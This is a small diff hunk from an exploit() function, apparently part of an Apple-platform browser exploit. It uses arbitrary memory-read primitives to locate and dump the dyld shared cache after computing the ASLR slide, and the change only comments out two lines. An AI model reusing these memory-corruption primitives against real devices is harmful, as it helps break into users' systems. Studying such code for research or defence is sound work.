@@ -499,8 +499,8 @@ function exploit(){
 	    var dcache_base = Add(0x180000000,slide);
 	    var magic =  r32(dcache_base);
 	    log('[+] Which has magic '+magic.toString(16));
-	    memory.read_i32(magic);
-	    log('magic = ' + magic);
+	   // memory.read_i32(magic);
+	    //log('magic = ' + magic);
 	    var dcache_dump = String.fromCharCode(...memory.copyfrom(dcache_base, 0x10, 100)); //dump first 100-bytes
 	    log('[+] Dumping dyld shared cache...');
 	    log(hexdump(dcache_dump, 0, dcache_base));
